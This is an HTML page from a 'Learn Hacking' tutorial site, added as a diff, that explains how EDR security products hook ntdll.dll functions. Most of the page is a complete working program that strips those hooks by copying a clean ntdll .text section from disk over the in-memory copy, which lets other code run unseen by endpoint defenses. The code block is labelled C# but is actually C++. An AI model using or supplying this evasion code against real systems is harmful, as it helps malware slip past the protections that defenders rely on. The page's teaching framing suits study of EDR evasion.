@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en" dir=>
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Unhooking EDR DLLs #  Endpoint Detection and Response solutions are basically enhanced anti-virus products. They usually have a kernel driver watching the creation of processes then inject their own DLL into the process that then hooks a shim in place of functions loaded by other DLLs in order to detect malicious or unwanted programs based on their API calls.
+A simple example is to hook VirtualProtect from ntdll.dll and watch for calls to set an area of memory PAGE_EXECUTE_READWRITE and if so, terminate the process.">
+<meta name="theme-color" content="#FFFFFF"><meta property="og:title" content="Unhooking EDR DLLs" />
+<meta property="og:description" content="Unhooking EDR DLLs #  Endpoint Detection and Response solutions are basically enhanced anti-virus products. They usually have a kernel driver watching the creation of processes then inject their own DLL into the process that then hooks a shim in place of functions loaded by other DLLs in order to detect malicious or unwanted programs based on their API calls.
+A simple example is to hook VirtualProtect from ntdll.dll and watch for calls to set an area of memory PAGE_EXECUTE_READWRITE and if so, terminate the process." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://brimstone.github.io/learn-hacking/docs/windows/evasion/unhooking/" /><meta property="article:section" content="docs" />
+
+<meta property="article:modified_time" content="2021-05-14T09:35:11-04:00" />
+
+<title>Unhooking EDR DLLs | Learn Hacking</title>
+<link rel="manifest" href="../../../../manifest.json">
+<link rel="icon" href="../../../../favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="../../../../book.min.601a93ba058c3e9d2332392f9a4cef5a1a269e08edd2b44f6885e02ddf096460.css" integrity="sha256-YBqTugWMPp0jMjkvmkzvWhomngjt0rRPaIXgLd8JZGA=">
+<script defer src="../../../../en.search.min.a63662e3ed085b31985fc4871639f88993ebc39a90aef7325d4ea7adbded4f1f.js" integrity="sha256-pjZi4&#43;0IWzGYX8SHFjn4iZPrw5qQrvcyXU6nrb3tTx8="></script>
+
+<script defer src="../../../../sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk="></script>
+<!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+  
+</head>
+
+<body dir=>
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="../../../../"><span>Learn Hacking</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/lab/" class="">Lab</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/recon/" class="">Recon</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/recon/tools/" class="">Tools</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/recon/tools/nmap/" class="">nmap</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/web/" class="">Web</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <span>Tools</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/web/tools/burp/" class="">Burp</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <span>Vulnerabilies</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/web/vulnerabilities/CSRF/" class="">CSRF</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/web/vulnerabilities/IDOR/" class="">IDOR</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/web/vulnerabilities/sqli/" class="">SQLi</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/web/vulnerabilities/xss/" class="">XSS</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/web/vulnerabilities/xxe/" class="">XXE</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/linux/" class="">Linux</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <a href="../../../../docs/windows/" class="">Windows</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/fundamentals/" class="">Fundamentals</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/fundamentals/logonsessions-tokens/" class="">Logon Sessions and Access Tokens</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/evasion/" class="">Evasion</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/evasion/amsi/" class="">AMSI</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="../../../../docs/windows/evasion/unhooking/" class="active">Unhooking EDR DLLs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="https://github.com/brimstone/learn-hacking" target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var a=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(b){localStorage.setItem("menu.scrollTop",a.scrollTop)}),a.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="../../../../svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Unhooking EDR DLLs</strong>
+
+  <label for="toc-control">
+    
+    <img src="../../../../svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#unhooking-edr-dlls">Unhooking EDR DLLs</a>
+      <ul>
+        <li><a href="#c">C#</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="unhooking-edr-dlls">
+  Unhooking EDR DLLs
+  <a class="anchor" href="#unhooking-edr-dlls">#</a>
+</h1>
+<p>Endpoint Detection and Response solutions are basically enhanced anti-virus products. They usually have a kernel driver watching the creation of processes then inject their own DLL into the process that then hooks a shim in place of functions loaded by other DLLs in order to detect malicious or unwanted programs based on their API calls.</p>
+<p>A simple example is to hook <code>VirtualProtect</code> from <code>ntdll.dll</code> and watch for calls to set an area of memory <code>PAGE_EXECUTE_READWRITE</code> and if so, terminate the process. This is done with the 
+  <a href="https://github.com/CCob/SylantStrike">SylantStrike</a> project.</p>
+<p>&ldquo;Unhooking&rdquo; refers to mapping the original function call back to its original location and leaving the shim left in unreferenced memory.</p>
+<h2 id="c">
+  C#
+  <a class="anchor" href="#c">#</a>
+</h2>
+<details >
+  <summary>Example</summary>
+  <div class="markdown-inner">
+    <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e"># Credit: https:</span><span style="color:#75715e">//www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+	HANDLE process <span style="color:#f92672">=</span> GetCurrentProcess();
+	MODULEINFO mi <span style="color:#f92672">=</span> {};
+	HMODULE ntdllModule <span style="color:#f92672">=</span> GetModuleHandleA(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>);
+
+	GetModuleInformation(process, ntdllModule, <span style="color:#f92672">&amp;</span>mi, <span style="color:#66d9ef">sizeof</span>(mi));
+	LPVOID ntdllBase <span style="color:#f92672">=</span> (LPVOID)mi.lpBaseOfDll;
+	HANDLE ntdllFile <span style="color:#f92672">=</span> CreateFileA(<span style="color:#e6db74">&#34;c:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">system32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">ntdll.dll&#34;</span>, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, <span style="color:#ae81ff">0</span>, NULL);
+	HANDLE ntdllMapping <span style="color:#f92672">=</span> CreateFileMapping(ntdllFile, NULL, PAGE_READONLY <span style="color:#f92672">|</span> SEC_IMAGE, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, NULL);
+	LPVOID ntdllMappingAddress <span style="color:#f92672">=</span> MapViewOfFile(ntdllMapping, FILE_MAP_READ, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+
+	PIMAGE_DOS_HEADER hookedDosHeader <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)ntdllBase;
+	PIMAGE_NT_HEADERS hookedNtHeader <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase <span style="color:#f92672">+</span> hookedDosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
+
+	<span style="color:#66d9ef">for</span> (WORD i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> hookedNtHeader<span style="color:#f92672">-&gt;</span>FileHeader.NumberOfSections; i<span style="color:#f92672">++</span>) {
+		PIMAGE_SECTION_HEADER hookedSectionHeader <span style="color:#f92672">=</span> (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) <span style="color:#f92672">+</span> ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER <span style="color:#f92672">*</span> i));
+
+		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>strcmp((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)hookedSectionHeader<span style="color:#f92672">-&gt;</span>Name, (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#e6db74">&#34;.text&#34;</span>)) {
+			DWORD oldProtection <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+			<span style="color:#66d9ef">bool</span> isProtected <span style="color:#f92672">=</span> VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase <span style="color:#f92672">+</span> (DWORD_PTR)hookedSectionHeader<span style="color:#f92672">-&gt;</span>VirtualAddress), hookedSectionHeader<span style="color:#f92672">-&gt;</span>Misc.VirtualSize, PAGE_EXECUTE_READWRITE, <span style="color:#f92672">&amp;</span>oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)ntdllBase <span style="color:#f92672">+</span> (DWORD_PTR)hookedSectionHeader<span style="color:#f92672">-&gt;</span>VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress <span style="color:#f92672">+</span> (DWORD_PTR)hookedSectionHeader<span style="color:#f92672">-&gt;</span>VirtualAddress), hookedSectionHeader<span style="color:#f92672">-&gt;</span>Misc.VirtualSize);
+			isProtected <span style="color:#f92672">=</span> VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase <span style="color:#f92672">+</span> (DWORD_PTR)hookedSectionHeader<span style="color:#f92672">-&gt;</span>VirtualAddress), hookedSectionHeader<span style="color:#f92672">-&gt;</span>Misc.VirtualSize, oldProtection, <span style="color:#f92672">&amp;</span>oldProtection);
+		}
+	}
+
+	CloseHandle(process);
+	CloseHandle(ntdllFile);
+	CloseHandle(ntdllMapping);
+	FreeLibrary(ntdllModule);
+
+	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+</code></pre></div><p><i>Source: <a href="../../../../examples/windows/evasion/unhook_csharp.cs">unhook_csharp.cs</a></i></p>
+
+  </div>
+</details>
+
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+  <div><a class="flex align-center" href="https://github.com/brimstone/learn-hacking/commit/cce09d2bbf44769a7602888fb0907da21d014151" title='Last modified by Matt Robinson | May 14, 2021' target="_blank" rel="noopener">
+      <img src="../../../../svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>May 14, 2021</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/brimstone/learn-hacking/edit/trunk/content/docs/windows/evasion/unhooking.md" target="_blank" rel="noopener">
+      <img src="../../../../svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+</div>
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#unhooking-edr-dlls">Unhooking EDR DLLs</a>
+      <ul>
+        <li><a href="#c">C#</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+ 
+    </aside>
+    
+  </main>
+
+  
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
